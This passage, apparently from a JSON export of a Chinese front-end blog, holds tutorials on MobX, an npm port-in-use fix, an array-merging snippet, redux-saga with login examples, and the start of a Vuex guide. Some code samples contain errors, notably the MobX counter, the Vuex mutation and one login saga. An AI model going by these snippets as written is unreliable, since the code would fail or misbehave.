在更新时需要将状态树的祖先数据进行复制和更新，新的对象会导致与之 connect的所有 UI 组件都重复渲染。因此Redux state 不建议进行深层嵌套，或者需要我们在组件中用 shouldComponentUpdate 优化。而 MobX 只自动更新你所关心的，不必担心嵌套带来的重渲染问题 redux 管理的是 (STORE -&gt; VIEW -&gt; ACTION) 的整个闭环，而 mobx 只关心 STORE -&gt; VIEW 的部分 优点 基于运行时的数据订阅 mobx 的数据依赖始终保持了最小，而且还是基于运行时。而如果用 redux，可能一不小心就多订阅或者少订阅了数据。所以为了达到高性能，我们需要借助 PureRenderMixin 以及 reselect 对 selector 做缓存 通过 OOP 的方式组织领域模型 (domain model) OOP 的方式在某些场景下会比较方便，尤其是容易抽取 domain model 的时候。进而由于 mobx 支持引用的方式引用数据，所以可以非常容易得形成模型图 (model graph )，这样可以更好地理解我们的应用。 修改数据方便自然 mobx 是基于原生的 JavaScript 对象、数组和 Class实现的。所以修改数据不需要额外语法成本，也不需要始终返回一个新的数据，而是直接操作数据 缺点 缺最佳实践和社区 mobx 比较新，遇到的问题可能社区都没有遇到过。并且，mobx 并没有很好的扩展/插件机制 随意修改 store 我们都知道 redux 里唯一可以改数据的地方是 reducer，这样可以保证应用的安全稳定；而 mobx 可以随意修改数据，触发更新，给人一种不安全的感觉 最新的mobx 2.2 加入了 action 的支持。并且在开启 strict mode 之后，就只有 action 可以对数据进行修改，限制数据的修改入口。可以解决这个问题 逻辑层的限制 如果更新逻辑不能很好地封装在 domain class 里，用 redux 会更合适。另外，mobx缺类 redux-saga 的库，业务逻辑的整合不知道放哪合适 二、核心API image.png 2.1 @observable Observable 值可以是JS基本数据类型、引用类型、普通对象、类实例、数组和映射。其修饰的state会暴露出来供观察者使用 123456789101112131415// Observable 值可以是JS基本数据类型、引用类型、普通对象、类实例、数组和映射@observable title = 'this is about page'@observable num = 0// 计算值(computed values)是可以根据现有的状态或其它计算值衍生出的值@computed get getUserInfo()&#123; return `我是computed经过计算的getter,currenct num:$&#123;this.num&#125;`&#125;// 注意：当你使用装饰器模式时，@action 中的 this 没有绑定在当前这个实例上，要用过 @action.bound 来绑定 使得 this 绑定在实例对象上@action.bound add()&#123; this.num ++&#125;@action.bound reduce()&#123; this.num --&#125; 2.2 observer 可以用作包裹 React 组件的高阶组件。 在组件的 render 函数中的任何已使用的 observable 发生变化时，组件都会自动重新渲染。 注意 observer 是由 &quot;mobx-react&quot; 包提供的，而不是 mobx 本身 @Observer 是一个注解，本质上是用 mobx.autorun 包装了组件的 render 函数以确保任何组件渲染中使用的数据变化时都可以强制刷新组件 2.3 @computed 计算值(computed values)是可以根据现有的状态或其它计算值衍生出的值 用于获取由基础 state衍生出来的值。如果基础值没有变，获取衍生值时就会走缓存，这样就不会引起虚拟 DOM 的重新渲染 getter：获得计算得到的新state并返回。 setter： 不能用来直接改变计算属性的值，但是它们可以用来作“逆向”衍生。 通过 @computed + getter函数来定义衍生值 123456789class Foo &#123; @observable length = 2; @computed get squared() &#123; return this.length * this.length; &#125; set squared(value) &#123; // 这是一个自动的动作，不需要注解 this.length = Math.sqrt(value); &#125;&#125; 2.4 @actions 只有在 actions 中，才可以修改 Mobx 中 state 的值 注意：当你使用装饰器模式时，@action 中的 this 没有绑定在当前这个实例上，要用过 `@action.bound来绑定 使得this` 绑定在实例对象上 通过引入 mobx 定义的严格模式，强制使用 action 来修改状态 123import &#123;configure&#125; from 'mobx';configure(&#123; enforceActions: 'always' &#125;) // 开启严格模式 123456@action.bound add()&#123; this.num ++&#125;@action.bound reduce()&#123; this.num --&#125; 2.5 autorun 当可观察对象中保存的值发生变化时，可以在mobx.autorun中被观察到。observable 的值初始化或改变时，自动运行 如果你想响应式的产生一个可以被其它 observer 使用的值，请使用 @computed，如果你不想产生一个新值，而想要达到一个效果，请使用 autorun。 举例来说，效果是像打印日志、发起网络请求等这样命令式的副作用 2.6 reactions Reactions和计算值很像，但它不是产生一个新的值，而是会产生一些副作用，比如打印到控制台、网络请求、递增地更新 React组件树以修补DOM、等等。 简而言之，reactions 在 响应式编程和命令式编程之间建立沟通的桥梁 2.7 Flow 用法: flow(function* (args) { }) flow() 接收 generator 函数作为它唯一的输入 12345678910111213141516171819202122232425import &#123; configure &#125; from 'mobx';// 不允许在动作外部修改状态configure(&#123; enforceActions: true &#125;);class Store &#123; @observable githubProjects = []; @observable state = \"pending\"; // \"pending\" / \"done\" / \"error\" fetchProjects = flow(function* fetchProjects() &#123; // &lt;- 注意*号，这是生成器函数！ this.githubProjects = []; this.state = \"pending\"; try &#123; const projects = yield fetchGithubProjectsSomehow(); // 用 yield 代替 await const filteredProjects = somePreprocessing(projects); // 异步代码自动会被 `action` 包装 this.state = \"done\"; this.githubProjects = filteredProjects; &#125; catch (error) &#123; this.state = \"error\"; &#125; &#125;)&#125; 三、计数器例子12345678910111213141516171819202122232425262728293031323334353637383940import React, &#123; Component &#125; from 'react';import &#123; observer &#125; from 'mobx-react';//结合reactimport &#123; observable, autorun,computed &#125; from 'mobx';// 定义数据storeclass Counter &#123; @observable number = 0; @computed get msg() &#123; return 'number:' + this.number &#125; // 用action改变数据，避免混乱 @action increment()&#123; this.number ++ &#125; @action decrement: () =&gt; &#123; this.number -- &#125;&#125;var store = new Counter()// 把属性注入react组件@observerclass App extends Component &#123; render() &#123; return (&lt;div&gt; &#123; store.msg &#125; &lt;br /&gt; &lt;button onClick=&#123;this.handleInc&#125;&gt; + &lt;/button&gt; &lt;button onClick=&#123;this.handleDec&#125;&gt; - &lt;/button&gt; &lt;/div&gt;); &#125; handleInc() &#123; store.increment(); &#125; handleDec() &#123; store.decrement(); &#125;&#125;ReactDOM.render(&lt;App /&gt;, document.getElementById('root')); 四、应用案例 https://github.com/poetries/react-mobx-template 五、参考 文档学习 https://cn.mobx.js.org/","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"MobX","slug":"MobX","permalink":"https://ru23.com/tags/MobX/"}]},{"title":"错误码：events.js:183 throw er; // Unhandled 'error' event—解决办法","slug":"2018-08-错误码：events-js-183-throw-er-Unhandled-error-event—解决办法","date":"2018-08-30T14:48:30.000Z","updated":"2018-10-24T03:46:02.605Z","comments":true,"path":"note/7ab2cbf3.html","link":"","permalink":"https://ru23.com/note/7ab2cbf3.html","excerpt":"","text":"控制台报错：12345678910111213141516171819202122232425Hash: 78f0873c3eb47a64bfaeVersion: webpack 1.14.0Time: 16mswebpack: Compiled successfully.events.js:183 throw er; // Unhandled &apos;error&apos; event ^Error: listen EADDRINUSE 127.0.0.1:8080 at Object._errnoException (util.js:1022:11) at _exceptionWithHostPort (util.js:1044:20) at Server.setupListenHandle [as _listen2] (net.js:1367:14) at listenInCluster (net.js:1408:12) at GetAddrInfoReqWrap.doListen [as callback] (net.js:1517:7) at GetAddrInfoReqWrap.onlookup [as oncomplete] (dns.js:97:10)npm ERR! code ELIFECYCLEnpm ERR! errno 1npm ERR! webpack-demos@1.0.0 dev: `webpack-dev-server --devtool eval --progress --colors`npm ERR! Exit status 1npm ERR!npm ERR! Failed at the webpack-demos@1.0.0 dev script.npm ERR! This is probably not a problem with npm. There is likely additional logging output above.npm ERR! A complete log of this run can be found in:npm ERR! C:\\Users\\qian\\AppData\\Roaming\\npm-cache\\_logs\\2018-08-30T14_46_37_546Z-debug.log 错误原因：端口号被占用 解决方案1.Win+R,cmd查询使用的端口号是否被占用：netstat -aon|findstr “8080”按回车显示占用8080端口对应的程序的PID号；2.根据PID号找到对应的程序：继续输入命令：tasklist|findstr “15008”按回车后显示出占用该端口的程序；3.按快捷键“Ctrl+Shift+Esc”调出Windows任务管理器，根据PID/程序对应名称结束该程序进程即可。","categories":[],"tags":[{"name":"npm","slug":"npm","permalink":"https://ru23.com/tags/npm/"}]},{"title":"合并数组的相同的key值，并且计算相同key值的个数","slug":"2018-08-合并数组的相同的key值，并且计算相同key值的个数","date":"2018-08-30T07:33:19.000Z","updated":"2018-10-24T03:46:02.601Z","comments":true,"path":"note/6de8207f.html","link":"","permalink":"https://ru23.com/note/6de8207f.html","excerpt":"","text":"需求：合并数组的相同的key值，并且计算相同key值的个数 场景：根据list数组的每一项的key值coupon_sn合并数组，并且计数 js代码json数组：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364let list = [&#123; \"id\": 5899, \"is_use\": 0, \"use_time\": null, \"expired_time\": \"2018-12-31 00:00:00\", \"coupon\": &#123; \"coupon_sn\": \"1\", \"name\": \"满减\", \"type\": 2, \"count\": 99993, \"receive_count\": 6, \"is_fare\": 0, \"available_money\": \"2000.00\", \"reduce_money\": \"100.00\", \"discount\": \"1.000\", \"receive_start_time\": \"2018-07-27 00:00:00\", \"receive_end_time\": \"2020-12-31 00:00:00\", \"info\": \"\", \"created_at\": \"2018-07-27 21:22:51\", \"restriction_description\": \"仅限非板材使用\" &#125;&#125;, &#123; \"id\": 5899, \"is_use\": 0, \"use_time\": null, \"expired_time\": \"2018-12-31 00:00:00\", \"coupon\": &#123; \"coupon_sn\": \"2\", \"name\": \"满减\", \"type\": 2, \"count\": 99993, \"receive_count\": 6, \"is_fare\": 0, \"available_money\": \"2000.00\", \"reduce_money\": \"100.00\", \"discount\": \"1.000\", \"receive_start_time\": \"2018-07-27 00:00:00\", \"receive_end_time\": \"2020-12-31 00:00:00\", \"info\": \"\", \"created_at\": \"2018-07-27 21:22:51\", \"restriction_description\": \"仅限非板材使用\" &#125;&#125;, &#123; \"id\": 5899, \"is_use\": 0, \"use_time\": null, \"expired_time\": \"2018-12-31 00:00:00\", \"coupon\": &#123; \"coupon_sn\": \"2\", \"name\": \"满减\", \"type\": 2, \"count\": 99993, \"receive_count\": 6, \"is_fare\": 0, \"available_money\": \"2000.00\", \"reduce_money\": \"100.00\", \"discount\": \"1.000\", \"receive_start_time\": \"2018-07-27 00:00:00\", \"receive_end_time\": \"2020-12-31 00:00:00\", \"info\": \"\", \"created_at\": \"2018-07-27 21:22:51\", \"restriction_description\": \"仅限非板材使用\" &#125;&#125;] js代码12345678910111213141516171819202122 let hash = &#123; coupon: &#123;&#125;,&#125;, i = 0, res = [];list.forEach(function(item ) &#123; let coupon_sn = item.coupon.coupon_sn; if (hash[coupon_sn]) &#123; if (!res[hash[coupon_sn] - 1].count) &#123; res[hash[coupon_sn] - 1].count = 1 &#125; res[hash[coupon_sn] - 1].count += 1 &#125; else &#123; hash[coupon_sn] = ++i &amp;&amp; res.push(&#123; \"count\": 1, \"id\": item.id, \"is_use\": item.is_use, \"use_time\": item.use_time, \"expired_time\": item.expired_time, \"coupon\": item.coupon &#125;) &#125;&#125;);console.log(res);","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"js代码片段","slug":"js代码片段","permalink":"https://ru23.com/tags/js代码片段/"}]},{"title":"浅析redux-saga中间件及用法","slug":"2018-08-redux-saga-and-redux-thunk","date":"2018-08-29T11:20:20.000Z","updated":"2018-10-24T03:46:02.557Z","comments":true,"path":"note/54c6f1e.html","link":"","permalink":"https://ru23.com/note/54c6f1e.html","excerpt":"","text":"一、redux-thunk1.1 redux的副作用处理 redux中的数据流大致是 1UI—————&gt;action（plain）—————&gt;reducer——————&gt;state——————&gt;UI image.png redux是遵循函数式编程的规则，上述的数据流中，action是一个原始js对象（plain object）且reducer是一个纯函数，对于同步且没有副作用的操作，上述的数据流起到可以管理数据，从而控制视图层更新的目的 如果存在副作用函数，那么我们需要首先处理副作用函数，然后生成原始的js对象。如何处理副作用操作，在redux中选择在发出action，到reducer处理函数之间使用中间件处理副作用 redux增加中间件处理副作用后的数据流大致如下： 1UI——&gt;action(side function)—&gt;middleware—&gt;action(plain)—&gt;reducer—&gt;state—&gt;UI image.png 在有副作用的action和原始的action之间增加中间件处理，从图中我们也可以看出，中间件的作用就是： 转换异步操作，生成原始的action，这样，reducer函数就能处理相应的action，从而改变state，更新UI 1.2 redux-thunk源码 在redux中，thunk是redux作者给出的中间件，实现极为简单，10多行代码 1234567891011121314function createThunkMiddleware(extraArgument) &#123; return (&#123; dispatch, getState &#125;) =&gt; next =&gt; action =&gt; &#123; if (typeof action === 'function') &#123; return action(dispatch, getState, extraArgument); &#125; return next(action); &#125;;&#125;const thunk = createThunkMiddleware();thunk.withExtraArgument = createThunkMiddleware;export default thunk; 这几行代码做的事情也很简单，判别action的类型，如果action是函数，就调用这个函数，调用的步骤为 1action(dispatch, getState, extraArgument); 发现实参为dispatch和getState，因此我们在定义action为thunk函数是，一般形参为dispatch和getState 1.3 redux-thunk的缺点 thunk的缺点也是很明显的，thunk仅仅做了执行这个函数，并不在乎函数主体内是什么，也就是说thunk使得redux可以接受函数作为action，但是函数的内部可以多种多样。比如下面是一个获取商品列表的异步操作所对应的action 12345678910111213export default ()=&gt;(dispatch)=&gt;&#123; fetch('/api/goodList',&#123; //fecth返回的是一个promise method: 'get', dataType: 'json', &#125;).then(function(json)&#123; var json=JSON.parse(json); if(json.msg==200)&#123; dispatch(&#123;type:'init',data:json.data&#125;); &#125; &#125;,function(error)&#123; console.log(error); &#125;);&#125;; 从这个具有副作用的action中，我们可以看出，函数内部极为复杂。如果需要为每一个异步操作都如此定义一个action，显然action不易维护 action不易维护的原因 action的形式不统一 就是异步操作太为分散，分散在了各个action中 二、redux-saga 简介 redux-saga是一个 redux中间件，它具有如下特性 集中处理 redux 副作用问题。 被实现为 generator 。 类 redux-thunk 中间件。 watch/worker（监听-&gt;执行） 的工作形式 redux-saga的优点 集中处理了所有的异步操作，异步接口部分一目了然 action是普通对象，这跟redux同步的action一模一样 通过Effect，方便异步接口的测试 通过worker 和watcher可以实现非阻塞异步调用，并且同时可以实现非阻塞调用下的事件监听 异步操作的流程是可以控制的，可以随时取消相应的异步操作 基本用法 使用createSagaMiddleware方法创建saga 的Middleware，然后在创建的redux的store时，使用applyMiddleware函数将创建的saga Middleware实例绑定到store上，最后可以调用saga Middleware的run函数来执行某个或者某些Middleware。 在saga的Middleware中，可以使用takeEvery或者takeLatest等API来监听某个action，当某个action触发后，saga可以使用call发起异步操作，操作完成后使用put函数触发action，同步更新state，从而完成整个State的更新。 三、redux-saga使用案例 redux-saga是控制执行的generator，在redux-saga中action是原始的js对象，把所有的异步副作用操作放在了saga函数里面。这样既统一了action的形式，又使得异步操作集中可以被集中处理 redux-saga是通过genetator实现的，如果不支持generator需要通过插件babel-polyfill转义。我们接着来实现一个输出hellosaga的例子 创建一个helloSaga.js文件 123export function * helloSaga() &#123; console.log('Hello Sagas!');&#125; 在redux中使用redux-saga中间件 在main.js中 12345678910import &#123; createStore, applyMiddleware &#125; from 'redux'import createSagaMiddleware from 'redux-saga'import &#123; helloSaga &#125; from './sagas'const sagaMiddleware=createSagaMiddleware();const store = createStore( reducer, applyMiddleware(sagaMiddleware));sagaMiddleware.run(helloSaga);//会输出Hello, Sagas! 和调用redux的其他中间件一样，如果想使用redux-saga中间件，那么只要在applyMiddleware中调用一个createSagaMiddleware的实例。唯一不同的是需要调用run方法使得generator可以开始执行 四、redux-saga使用细节4.1 声明式的Effect 在redux-saga中提供了一系列的api，比如take、put、all、select等API，在redux-saga中将这一系列的api都定义为Effect。这些Effect执行后，当函数resolve时返回一个描述对象，然后redux-saga中间件根据这个描述对象恢复执行generator中的函数 redux-thunk的大体过程 action1(side function)—&gt;redux-thunk监听—&gt;执行相应的有副作用的方法—&gt;action2(plain object) 转化到action2是一个原始js对象形式的action，然后执行reducer函数就会更新store中的state redux-saga的大体过程 action1(plain object)——&gt;redux-saga监听—&gt;执行相应的Effect方法——&gt;返回描述对象—&gt;恢复执行异步和副作用函数—&gt;action2(plain object) image.png 对比redux-thunk我们发现，redux-saga中监听到了原始js对象action，并不会马上执行副作用操作，会先通过Effect方法将其转化成一个描述对象，然后再将描述对象，作为标识，再恢复执行副作用函数 4.2 Effect提供的具体方法 下面来介绍几个Effect中常用的几个方法，从低阶的API，比如take，call(apply)，fork，put，select等，以及高阶API，比如takeEvery和takeLatest等 1import &#123;take,call,put,select,fork,takeEvery,takeLatest&#125; from &apos;redux-saga/effects&apos; 4.2.1 take take这个方法，是用来监听action，返回的是监听到的action对象。比如 123const loginAction = &#123; type:&apos;login&apos;&#125; 在UI Component中dispatch一个action 1dispatch(loginAction) 在saga中使用： 1const action = yield take(&apos;login&apos;); 可以监听到UI传递到中间件的Action,上述take方法的返回，就是dipath的原始对象。一旦监听到login动作，返回的action为： 123&#123; type:&apos;login&apos;&#125; 4.2.2 call(apply) call和apply方法与js中的call和apply相似，我们以call方法为例 1call(fn, ...args) call方法调用fn，参数为args，返回一个描述对象。不过这里call方法传入的函数fn可以是普通函数，也可以是generator。call方法应用很广泛，在redux-saga中使用异步请求等常用call方法来实现 1yield call(fetch,&apos;/userInfo&apos;,username) 4.2.3 put redux-saga做为中间件，工作流是这样的 1UI——&gt;action1————&gt;redux-saga中间件————&gt;action2————&gt;reducer.. 从工作流中，我们发现redux-saga执行完副作用函数后，必须发出action，然后这个action被reducer监听，从而达到更新state的目的。相应的这里的put对应与redux中的dispatch，工作流程图如下 image.png 可以看出redux-saga执行副作用方法转化action时，put这个Effect方法跟redux原始的dispatch相似，都是可以发出action，且发出的action都会被reducer监听到。put的使用方法 1yield put(&#123;type:&apos;login&apos;&#125;) 4.2.4 select put方法与redux中的dispatch相对应，同样的如果我们想在中间件中获取state，那么需要使用select。select方法对应的是redux中的getState，用户获取store中的state，使用方法： 1const id = yield select(state =&gt; state.id); 4.2.5 fork fork方法相当于web work，fork方法不会阻塞主线程，在非阻塞调用中十分有用 4.2.6 takeEvery和takeLatest takeEvery和takeLatest用于监听相应的动作并执行相应的方法，是构建在take和fork上面的高阶api，比如要监听login动作，好用takeEvery方法可以 1takeEvery(&apos;login&apos;,loginFunc) takeEvery监听到login的动作，就会执行loginFunc方法，除此之外，takeEvery可以同时监听到多个相同的action。 takeLatest方法跟takeEvery是相同方式调用 1takeLatest(&apos;login&apos;,loginFunc) 与takeLatest不同的是，takeLatest是会监听执行最近的那个被触发的action 五、案例分析一 接着我们来实现一个redux-saga样例，存在一个登陆页，登陆成功后，显示列表页，并且，在列表页，可以点击登出，返回到登陆页。例子的最终展示效果如下 image.png 样例的功能流程图为 image.png 5.1 LoginPanel(登陆页)输入时时保存用户名和密码 用户名输入框和密码框onchange时触发的函数为 123456changeUsername:(e)=&gt;&#123; dispatch(&#123;type:'CHANGE_USERNAME',value:e.target.value&#125;); &#125;,changePassword:(e)=&gt;&#123; dispatch(&#123;type:'CHANGE_PASSWORD',value:e.target.value&#125;);&#125; 在函数中最后会dispatch两个action：CHANGE_USERNAME和CHANGE_PASSWORD 在saga.js文件中监听这两个方法并执行副作用函数，最后put发出转化后的action，给reducer函数调用 1234567891011121314function * watchUsername()&#123; while(true)&#123; const action= yield take('CHANGE_USERNAME'); yield put(&#123;type:'change_username', value:action.value&#125;); &#125;&#125;function * watchPassword()&#123; while(true)&#123; const action=yield take('CHANGE_PASSWORD'); yield put(&#123;type:'change_password', value:action.value&#125;); &#125;&#125; 最后在reducer中接收到redux-saga的put方法传递过来的action：change_username和change_password，然后更新state 监听登陆事件判断登陆是否成功 在UI中发出的登陆事件为 123toLoginIn:(username,password)=&gt;&#123; dispatch(&#123;type:'TO_LOGIN_IN',username,password&#125;);&#125; 登陆事件的action为：TO_LOGIN_IN.对于登入事件的处理函数为： 12345678910111213while(true)&#123; //监听登入事件 const action1=yield take('TO_LOGIN_IN'); const res=yield call(fetchSmart,'/login',&#123; method:'POST', body:JSON.stringify(&#123; username:action1.username, password:action1.password &#125;) if(res)&#123; put(&#123;type:'to_login_in'&#125;); &#125;&#125;); 在上述的处理函数中，首先监听原始动作提取出传递来的用户名和密码，然后请求是否登陆成功，如果登陆成功有返回值，则执行put的action:to_login_in 5.2 LoginSuccess (登陆成功列表展示页) 登陆成功后的页面功能包括： 获取列表信息，展示列表信息 登出功能，点击可以返回登陆页面 获取列表信息 1234567891011121314import &#123;delay&#125; from 'redux-saga';function * getList()&#123; try &#123; yield delay(3000); const res = yield call(fetchSmart,'/list',&#123; method:'POST', body:JSON.stringify(&#123;&#125;) &#125;); yield put(&#123;type:'update_list',list:res.data.activityList&#125;); &#125; catch(error) &#123; yield put(&#123;type:'update_list_error', error&#125;); &#125;&#125; 为了演示请求过程，我们在本地mock，通过redux-saga的工具函数delay，delay的功能相当于延迟xx秒，因为真实的请求存在延迟，因此可以用delay在本地模拟真实场景下的请求延迟 登出功能 12const action2=yield take(&apos;TO_LOGIN_OUT&apos;);yield put(&#123;type:&apos;to_login_out&apos;&#125;); 与登入相似，登出的功能从UI处接受action:TO_LOGIN_OUT,然后转发action:to_login_out 完整的实现登入登出和列表展示的代码 1234567891011121314151617181920212223242526272829303132333435363738function * getList()&#123; try &#123; yield delay(3000); const res = yield call(fetchSmart,'/list',&#123; method:'POST', body:JSON.stringify(&#123;&#125;) &#125;); yield put(&#123;type:'update_list',list:res.data.activityList&#125;); &#125; catch(error) &#123; yield put(&#123;type:'update_list_error', error&#125;); &#125;&#125;function * watchIsLogin()&#123; while(true)&#123; //监听登入事件 const action1=yield take('TO_LOGIN_IN'); const res=yield call(fetchSmart,'/login',&#123; method:'POST', body:JSON.stringify(&#123; username:action1.username, password:action1.password &#125;) &#125;); //根据返回的状态码判断登陆是否成功 if(res.status===10000)&#123; yield put(&#123;type:'to_login_in'&#125;); //登陆成功后获取首页的活动列表 yield call(getList); &#125; //监听登出事件 const action2=yield take('TO_LOGIN_OUT'); yield put(&#123;type:'to_login_out'&#125;); &#125;&#125; 通过请求状态码判断登入是否成功，在登陆成功后，可以通过 1yield call(getList) 注意call方法调用是会阻塞主线程的，具体来说 在call方法调用结束之前，call方法之后的语句是无法执行的 如果call(getList)存在延迟，call(getList)之后的语句 const action2=yieldtake(&#39;TO_LOGIN_OUT&#39;)在call方法返回结果之前无法执行 在延迟期间的登出操作会被忽略 image.png 无阻塞调用 1yield call(getList) 修改为 1yield fork(getList) 通过fork方法不会阻塞主线程，在白屏时点击登出，可以立刻响应登出功能，从而返回登陆页面 六、案例分析二6.1 配置saga信息 src/store/configureStore.js 1234567891011121314151617181920212223242526272829303132333435363738394041import &#123; createStore, applyMiddleware, compose &#125; from 'redux'// import &#123;createLogger &#125; from 'redux-logger'import createHistory from 'history/createBrowserHistory'import createSagaMiddleware from 'redux-saga';import &#123; routerMiddleware &#125; from 'react-router-redux'import rootSaga from '../sagas'import rootReducer from '../reducers/'export const history = createHistory()const middleware = routerMiddleware(history)//创建saga middlewareconst sagaMiddleware = createSagaMiddleware();const configureStore = preloadedState =&gt; &#123; // 安装 Redux-DevTools Chrome 插件后可用 composeEnhancers() const composeEnhancers = window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__ || compose const store = createStore( rootReducer, preloadedState, composeEnhancers( applyMiddleware(sagaMiddleware,middleware) ) ) sagaMiddleware.run(rootSaga); if (module.hot) &#123; // Enable Webpack hot module replacement for reducers module.hot.accept('../reducers', () =&gt; &#123; const nextRootReducer = require('../reducers').default store.replaceReducer(nextRootReducer) &#125;) &#125; return store&#125;export default configureStore 6.2 配置reduce12345678910// src/reducers/index.jsimport &#123;combineReducers&#125; from 'redux'import &#123;routerReducer as routing&#125; from 'react-router-redux'const rootReducer = combineReducers(&#123; routing, poetry : require('./poetry').default&#125;)export default rootReducer 1234567891011121314151617181920// src/reducers/poetry.jsimport * as ActionTypes from '../actions'export default (state = &#123; fetching:false, error:false, errMsg:'', data:[]&#125;,action) =&gt; &#123; if(action.type === ActionTypes.FETCH_POETRY_REQUEST)&#123; return Object.assign(&#123;...state,fetching:true,errMsg:''&#125;) &#125;else if(action.type === ActionTypes.FETCH_POETRY_SUCCESS)&#123; const data = action.payload.data return Object.assign(&#123;...state,fetching:false,data,errMsg:''&#125;) &#125;else if(action.type === ActionTypes.FETCH_POETRY_FAILURE)&#123; return Object.assign(&#123;...state,fetching:false,error:true,errMsg:action.payload.errMsg&#125;) &#125; return state&#125; 6.3 处理action12345678910111213141516171819// src/action/index.jsimport &#123; createAction &#125; from 'redux-actions';export const COMMON_FETCHING = 'COMMON_FETCHING'export const COMMON_OVER = 'COMMON_OVER'export const MSG_SHOW = 'MSG_SHOW'export const MSG_INIT = 'MSG_INIT'export const POP_LOGIN = 'POP_LOGIN'export const initMsg = () =&gt; (&#123;type : MSG_INIT&#125;)// 相比用thunk多了一步 多了个action 来触发saga wokerexport const FETCH_POETRY_REQUEST = 'FETCH_POETRY_REQUEST'export const FETCH_POETRY_SUCCESS = 'FETCH_POETRY_SUCCESS'export const FETCH_POETRY_FAILURE = 'FETCH_POETRY_FAILURE'export const fetchPoetryRequest = createAction(FETCH_POETRY_REQUEST)export const fetchPoetrySuccess = createAction(FETCH_POETRY_SUCCESS)export const fetchPoetryFauilure= createAction(FETCH_POETRY_FAILURE) 6.4 处理sagas12345678910// src/sagas/index.jsimport &#123; all &#125; from 'redux-saga/effects'export default function* rootSaga() &#123; yield all([ ...require('./fetchPoetry').default ]) &#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// src/fetchPoetry.jsimport &#123;put,take,call,fork,takeEvery,select&#125; from 'redux-saga/effects'import &#123;delay&#125; from 'redux-saga'import * as api from '../api'import * as actionTypes from '../actions/'// saga worker 监听FETCH_POETRY_REQUEST动作触发执行相应操作function* fetchPoetrySaga()&#123; // yield delay(100) // ======== 写法一 ========= // yield takeEvery(actionTypes.FETCH_POETRY_REQUEST,function*(action)&#123; // // 调用this.props.fetchPoetryRequest(&#123;user:'poetries',age:23&#125;) 传参进来这里 // // 也可以通过这样获取state中的参数 const state = yield select() // const &#123;user,age&#125; = action // try&#123; // const data = yield call(api.get(&#123; // url:'/mock/5b7fd63f719c7b7241f4e2fa/tangshi/tang-shi' // &#125;)) // yield put(actionTypes.fetchPoetrySuccess(&#123;data:data.data.data&#125;)) // &#125;catch(error)&#123; // yield put(actionTypes.fetchPoetryFauilure(&#123;errMsg:error.message&#125;)) // &#125; // &#125;) // === 写法二==== while(true)&#123; // 当dispatch(&#123;type:FETCH_POETRY_REQUEST&#125;)的时候被这里监听 执行对应的请求 const &#123;user,age&#125; = yield take(actionTypes.FETCH_POETRY_REQUEST) try&#123; const data = yield call(api.get(&#123; url:'/mock/5b7fd63f719c7b7241f4e2fa/tangshi/tang-shi' &#125;)) yield put(actionTypes.fetchPoetrySuccess(&#123;data:data.data.data&#125;)) &#125;catch(error)&#123; yield put(actionTypes.fetchPoetryFauilure(&#123;errMsg:error.message&#125;)) &#125; &#125;&#125; // 导出所有的sagaexport default [ fork(fetchPoetrySaga)] 完整代码例子 https://github.com/poetries/redux-saga-template 七、总结 redux-saga做为redux中间件的全部优点 统一action的形式，在redux-saga中，从UI中dispatch的action为原始对象 集中处理异步等存在副作用的逻辑 通过转化effects函数，可以方便进行单元测试 完善和严谨的流程控制，可以较为清晰的控制复杂的逻辑","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Redux","slug":"Redux","permalink":"https://ru23.com/tags/Redux/"},{"name":"中间件","slug":"中间件","permalink":"https://ru23.com/tags/中间件/"}]},{"title":"vue状态管理之vuex（十六）","slug":"2018-08-vue-vuex","date":"2018-08-29T03:30:32.000Z","updated":"2018-10-24T03:46:02.559Z","comments":true,"path":"note/a8440b25.html","link":"","permalink":"https://ru23.com/note/a8440b25.html","excerpt":"","text":"了解vuex核心概念请移步 https://vuex.vuejs.org/zh/ 一、初始vuex1.1 vuex是什么 vuex 就是把需要共享的变量全部存储在一个对象里面，然后将这个对象放在顶层组件中供其他组件使用 父子组件通信时，我们通常会采用 props + emit 这种方式。但当通信双方不是父子组件甚至压根不存在相关联系，或者一个状态需要共享给多个组件时，就会非常麻烦，数据也会相当难维护 1.2 vuex中有什么1234567891011121314151617181920212223242526const store = new Vuex.Store(&#123; state: &#123; name: 'weish', age: 22 &#125;, getters: &#123; personInfo(state) &#123; return `My name is $&#123;state.name&#125;, I am $&#123;state.age&#125;`; &#125; &#125; mutations: &#123; SET_AGE(state, age) &#123; commit(age, age); &#125; &#125;, actions: &#123; nameAsyn(&#123;commit&#125;) &#123; setTimeout(() =&gt; &#123; commit('SET_AGE', 18); &#125;, 1000); &#125; &#125;, modules: &#123; a: modulesA &#125;&#125; 个就是最基本也是完整的vuex代码；vuex 包含有五个基本的对象 state：存储状态。也就是变量； getters：派生状态。也就是set、get中的get，有两个可选参数：state、getters分别可以获取state中的变量和其他的getters。外部调用方式：store.getters.personInfo()。就和vue的computed差不多； mutations：提交状态修改。也就是set、get中的set，这是vuex中唯一修改state的方式，但不支持异步操作。第一个参数默认是state。外部调用方式：store.commit(&#39;SET_AGE&#39;, 18)。和vue中的methods类似。 actions：和mutations类似。不过actions支持异步操作。第一个参数默认是和store具有相同参数属性的对象。外部调用方式：store.dispatch(&#39;nameAsyn&#39;)。 modules：store的子模块，内容就相当于是store的一个实例。调用方式和前面介绍的相似，只是要加上当前子模块名，如：store.a.getters.xxx() 1.3 vue-cli中使用vuex的方式目录结构 12345678910111213├── index.html├── main.js├── components└── store ├── index.js # 我们组装模块并导出 store 的地方 ├── state.js # 跟级别的 state ├── getters.js # 跟级别的 getter ├── mutation-types.js # 根级别的mutations名称（官方推荐mutions方法名使用大写） ├── mutations.js # 根级别的 mutation ├── actions.js # 根级别的 action └── modules ├── m1.js # 模块1 └── m2.js # 模块2 state示例 123456const state = &#123; name: 'weish', age: 22&#125;;export default state; getter示例 getters.js示例（我们一般使用getters来获取state的状态，而不是直接使用state） 1234567891011export const name = (state) =&gt; &#123; return state.name;&#125;export const age = (state) =&gt; &#123; return state.age&#125;export const other = 